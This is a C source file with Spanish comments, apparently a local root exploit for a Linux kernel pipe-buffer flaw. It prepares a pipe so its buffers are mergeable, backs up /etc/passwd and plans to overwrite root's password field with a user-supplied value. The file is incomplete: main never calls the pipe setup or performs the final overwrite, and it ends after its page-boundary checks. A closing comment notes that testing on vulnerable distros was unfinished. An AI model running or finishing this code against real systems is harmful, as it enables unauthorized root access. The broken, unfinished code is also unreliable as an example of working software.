#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

/**
 * Prepara una tubería en la que todos los bloques de datos tengan la capacidad de fusionarse.
 */
static void prepare_pipe(int p[2])
{
    if (pipe(p))
        abort();

    const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    static char buffer[4096];

    /* Llena la tubería completamente; cada bloque de datos ahora tiene la capacidad de fusionarse */
    for (unsigned r = pipe_size; r > 0;)
    {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        write(p[1], buffer, n);
        r -= n;
    }

    /* Vacía la tubería, liberando todos los bloques de datos (pero manteniendo las capacidades de fusión inicializadas) */
    for (unsigned r = pipe_size; r > 0;)
    {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        read(p[0], buffer, n);
        r -= n;
    }

    /* La tubería está ahora vacía y si alguien agrega un nuevo bloque de datos sin inicializar sus capacidades, el bloque será fusionable */
}

int main()
{
    const char *const path = "/etc/passwd";

    printf("Ingrese la nueva contraseña para root: ");
    char password[100];
    fgets(password, sizeof(password), stdin);
    password[strcspn(password, "\n")] = '\0'; // Elimina el salto de línea al final de la contraseña ingresada

    printf("Realizando una copia de seguridad de /etc/passwd en /tmp/passwd.bak ...\n");
    FILE *f1 = fopen("/etc/passwd", "r");
    FILE *f2 = fopen("/tmp/passwd.bak", "w");

    if (f1 == NULL)
    {
        printf("No se pudo abrir /etc/passwd\n");
        exit(EXIT_FAILURE);
    }
    else if (f2 == NULL)
    {
        printf("No se pudo abrir /tmp/passwd.bak\n");
        fclose(f1);
        exit(EXIT_FAILURE);
    }

    char c;
    while ((c = fgetc(f1)) != EOF)
        fputc(c, f2);

    fclose(f1);
    fclose(f2);

    loff_t offset = 4; // Después de "root"
    const char *const data = password;
    printf("Estableciendo la contraseña de root como \"%s\"...\n", data);
    const size_t data_size = strlen(data);

    if (offset % PAGE_SIZE == 0)
    {
        fprintf(stderr, "Lo siento, no se puede comenzar a escribir en un límite de página\n");
        return EXIT_FAILURE;
    }

    const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
    const loff_t end_offset = offset + (loff_t)data_size;
    if (end_offset > next_page)
    {
        fprintf(stderr, "Lo siento, no se puede escribir a través de un límite de página\n");
        return EXIT_FAILURE;
    }
}
    // debido a la falta de tiempo no pude encontrar mas distros de linux con el kernel vulnerable por lo que aun faltaron pruebas por hacer
